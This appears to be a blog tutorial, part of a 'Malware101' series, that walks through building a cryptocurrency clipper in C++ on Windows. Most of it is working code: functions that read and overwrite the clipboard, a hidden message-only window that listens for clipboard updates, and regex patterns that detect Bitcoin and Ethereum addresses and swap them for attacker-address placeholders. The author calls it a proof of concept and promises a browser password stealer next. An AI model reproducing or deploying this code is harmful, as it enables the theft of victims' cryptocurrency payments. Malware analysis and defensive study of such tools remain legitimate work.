## What is a Crypto Stealer ? 

Crypto stealer malware is a type of malicious software that is designed to steal cryptocurrencies from the victim's wallet or account. Once installed these malwares often operate by monitoring the device for cryptocurrency-related activity. When the victim attempts to access their wallet or account in anyway, the malware captures their login credentials and sends them to the attacker.

## In this post we will be focusing on Crypto Clippers which can be classfied under the Crypto Stealers family.

Crypto clipper malwares are a type of malicious software that targets cryptocurrencies. These malwares typically operate by replacing a user's cryptocurrency address with the attacker's own address when the user attempts to make a transaction. This allows the attacker to redirect the funds from the intended recipient to their own wallet.

Crypto clipper malwares often operate by injecting/monitoring the user's clipboard, which is used to store temporary data such as text or images that have been copied. When the user attempts to paste the address of the intended recipient into the cryptocurrency wallet software, the malware replaces the address with the attacker's own address before it is pasted.

This type of malware is interesting because it is simple yet capable of causing significant damage. In some cases, malware clippers only have the ability to monitor input and alter the clipboard, which looks harmless and unlikely to raise any alarms. 

In this post I will be going over basic design and implementation details of a simple clipper malware. We will be working on a windows environment with C++. We will also be utilizing some winapi functions, the heart of this malware is all about monitoring and changing clipboard data with the winapi.


## Design requirements

##### Windows offers various functions of interest that will make our jobs easier to build this. We will be using the following functions from the winapi

- OpenClipboard() to get access to the clipboard.
- IsClipboardFormatAvailable() to examin the content of the clipboard. Keep in mind that things like emojis and images can be copied so we dont want to get whatever data there is we are only interested in text data. 
- GetClipboardData() to get the actual text data.
- CloseClipboard() and GlobalLock() to free data and unlock resources.


##### These are all the functions we will be using from the winapi except for a few cleanup functions I didn't include in the list we will discuss them later in the Implementation section. 

#### The function we will need to implement ourselves are fairly simple.

- crypto_check(CONST CHAR* address, CONST CHAR* regex_pattern) a function to check the given data against a regex pattern for a crypto address.

This should be all for the basic barebone implementation of this malware. I won't be adding any anti-reversing/vm checks or evasion techniques, I will have write ups for those topics soon. For now I'm going to try and keep this one very short.

## Implementation


### Part 1 
##### First steps is to implement get_clip_data(HWND handle) function. The HWND(window handle) will be used later for now we can just set it to NULL whenever we call the function.

```Cpp
CONST CHAR* get_clip_data(HWND hd)
{

    DEBUG_PRINT("get_clip_data function running\n");

    if (!OpenClipboard(hd)) { // Access to clipboard

        DEBUG_PRINT("Error - Failed to open clipboard\n");
        return NULL;
    }

    if (!IsClipboardFormatAvailable(CF_TEXT)) // Checking for text format only
    {
        DEBUG_PRINT("Data in clipboard is not CF_TEXT");
        CloseClipboard();
        return NULL;
    }

    HANDLE MemBlock = GetClipboardData(CF_TEXT); // get data from the clipboard in text format
    if (MemBlock == NULL) {
        DEBUG_PRINT("Error - Get clipboard data failed \n");
        CloseClipboard();
        return NULL;
    }

    CHAR* Data = static_cast<char*>(GlobalLock(MemBlock)); // Casting Handle clipboard object to char* to access the data

    if (Data == NULL){
        DEBUG_PRINT("Error - Data is empty.... \n");
        CloseClipboard();
        return NULL;
    }
    //GlobalUnlock(MemBlock);
    CloseClipboard();
    return Data;
}
```

##### set_clip_data(CONST CHAR* data, HWND handle)

```Cpp

BOOL set_clip_data(CONST CHAR* data, HWND handle)
{

    DEBUG_PRINT("set clip data function funning.\n");

    if (!OpenClipboard(handle)) {
        DEBUG_PRINT("Error - opening clipboard failed.\n");
        return false;
    }

    if (!EmptyClipboard()) {
        DEBUG_PRINT("Error - empty clipboard function failed.\n");
        CloseClipboard();
        return false;
    }

    HGLOBAL MemBlock = GlobalAlloc(GMEM_MOVEABLE, (strlen(data) + 1));
    if (MemBlock == NULL) {
        DEBUG_PRINT("Error - GloableAlloc Failed\n");
        CloseClipboard();
        return false;
    }
    

    memcpy(GlobalLock(MemBlock), data, (strlen(data) + 1));
    GlobalUnlock(MemBlock);
       
    DEBUG_PRINT("set data to clipboard\n");
    if (SetClipboardData(CF_TEXT, MemBlock) == NULL) {
        CloseClipboard();
        return false;
    }

    CloseClipboard();
    return true;
}
```

##### What is this GlobalAllock/Lock/Unlock stuff ? A quick summary about this, windows has a Global memory "region" where programs can read and write and share resources. What is an example of this ? clipboard! this is why we can copy and paste data between all different apps running on windows. More [GLobal Memory][2] 

#### Lets test what we have 

![clip](https://user-images.githubusercontent.com/120695832/210182229-2f181649-f62e-445e-912a-59e01a2f6a4f.gif)


#### It seems like everything is working. In part two, we will implement the message handler and crypto checker function. This will allow us to monitor clipboard activity and implement the malicious part of this software.

#### Now, using the following functions, we can actually start getting the desired data from the clipboard, but it's useless because we don't know when the user is using the clipboard. We would also need to run an infinite loop every couple of seconds, hoping we capture the crypto address we want. This is bad for performance and would probably not work in the real world, so we need to find a better solution. Thankfully, Windows has a [WM_CLIPBOARDUPDATE][1] message, which is sent whenever the clipboard is updated. We will need to listen to those messages when we subscribe to those messages with the  AddClipboardFormatListener() function.

### Part 2

##### In order to be notified of clipboard updates, we can use the `WM_CLIPBOARDUPDATE` message. We previously developed functions to retrieve and set clipboard data. Now, we just need to subscribe to the `WM_CLIPBOARDUPDATE` message in order to be notified whenever the clipboard is updated.

##### Let's start with the WindowProc (window procedure) function. A WindowProc function is a callback function that processes messages sent to a window. We define it in our application to handle messages sent to our window.


```cpp
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    LRESULT result = 0;
    switch (uMsg)
    {
        case WM_CREATE:
        {
            ShowWindow(GetConsoleWindow(), SW_SHOW); // show the console for testing purposes
            AddClipboardFormatListener(hwnd); // registers our window to receive clipboard change notifications. 
            break;
        }

        case WM_CLIPBOARDUPDATE: // heres the message we want
        {
            printf("[+] Data changed : %s\n", get_clip_data(hwnd)); // Now we can get the data we want whenever a change happens.
            break;
        }

        case WM_DESTROY:
        {
            RemoveClipboardFormatListener(hwnd);
            break;
        }

        default:
        {
            result = DefWindowProc(hwnd, uMsg, wParam, lParam);
            break;
        }

    }
    return (result);
}
```

##### There is a lot to windProc and how it works. For now think about this as a way for our software to receive and handle messages from the operating system or other applications. I recommend reading more about it in the offical docs and if your a beginner start here [WindProc][3]

##### Lets create our window 

```cpp
WNDCLASSEX windProperties(const wchar_t* name) {
    HWND wind = NULL;
    WNDCLASSEX wc = { 0 };
    wc.cbSize = sizeof(WNDCLASSEX);
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = name;

    return wc;
}

// for our get/dispatchMessage loop

void run_message_loop()
{
    const wchar_t* className = L"Test";
    HWND hWindow = NULL;

    WNDCLASSEX wx = windProperties(className);
    RegisterClassEx(&wx);

    hWindow = CreateWindowEx(
        0,
        className,
        L"ClipboardListener",
        0, 0, 0, 0, 0,
        HWND_MESSAGE,
        NULL, NULL, NULL);


    // Main msg loop
    MSG msg = { 0 };
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}

```
##### This message loop/winproc is basic procedure when working with windows(guis) and messages and this article from Microsoft does a good job at explaining it. [Creating-Windows][4]

##### But here is a quick summary on how this whole process works.

- The window procedure is a callback function that processes messages sent to a window.
- The message loop is a loop that retrieves and dispatches messages. It is used to keep the application running and responsive to user input and other events.
- When a message is sent to a window, the window procedure is called with the handle to the window, the message identifier, and any additional parameters related to the message.
- The window procedure processes the message and returns a result.
- The message loop retrieves messages from the message queue and dispatches them to the appropriate window procedure for processing.
- The message loop runs continuously until the application is closed or the loop is terminated.

So a quick summary of this, the window procedure is a way for your application to receive and handle messages, and the message loop is a way for the application to keep running and respond to those messages.

#### Now with that out the way lets put everything togather and try this 

![clip2](https://user-images.githubusercontent.com/120695832/210184599-a50126d0-5164-4cc6-b018-46f7099ed50d.gif)


#### Everything seems to work. Now to our final step adding the crypto checker function. We will be using regex to match address patterns.

```cpp
bool crypto_check(CONST CHAR* addr_search, CONST CHAR* addr_pattern)
{
    std::regex pattern(addr_pattern);
    if (std::regex_match(addr_search, pattern)) {
        return true;
    }
    return false;
}

void crypto_swap(CONST CHAR* addr_search, HWND handle) {

    const int size = 2;
    CONST CHAR* ATTACKER_ADDR[size] =
    {
        "SWAPPED_WITH_ATTACKER_BTC_ADDRESS",
        "SWAPPED_WITH_ATTACKER_ETH_ADDRESS"
    };

    CONST CHAR* PATTERN_ADDR[size] =
    {

        "^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$",
        "^0x[a-fA-F0-9]{40}"
    };
    
    for (size_t i = 0; i < size; i++)
    {
        if (crypto_check(addr_search, PATTERN_ADDR[i]))
        {
            set_clip_data(ATTACKER_ADDR[i], handle);
        }
    }
}
```
#### There are two new functions. The `crypto_check()` function checks a given string for an address pattern. If the regex match is true, we return true.
#### For `crypto_swap`, we simply check the given data against a list of patterns. If anything matches, we swap the clipboard data with the matching index from the ATTACKER_ADDR array. 

## Here is the final product

![clipf](https://user-images.githubusercontent.com/120695832/210186664-854875a0-b1f9-49fb-9de6-b6b88d05fd0b.gif)

#### As you see whenever the data is detected to be some kind of crypto address the original address is swapped with the attackers address. Very simple but was very effective a couple years ago.

#### It was fun writing this, this was a simple PoC implementaion of the main idea there's still lots of featuers to make this an actual functioning malware. 

## What's next ?
##### In the next Malware101 series, I would like to cover browsers information-stealing malwares. Raccoon malware is a popular example. I'd like to talk about and implement some of the features these malwares ship with, such as password stealing from browsers.

[1]: https://learn.microsoft.com/en-us/windows/win32/dataxchg/wm-clipboardupdate "WM_CLIPBOARDUPDATE"
[2]: https://learn.microsoft.com/en-us/windows/win32/memory/memory-management-functions "GLobal Memory"
[3]: http://www.winprog.org/tutorial/window_click.html
[4]: https://learn.microsoft.com/en-us/cpp/windows/walkthrough-creating-windows-desktop-applications-cpp?view=msvc-170
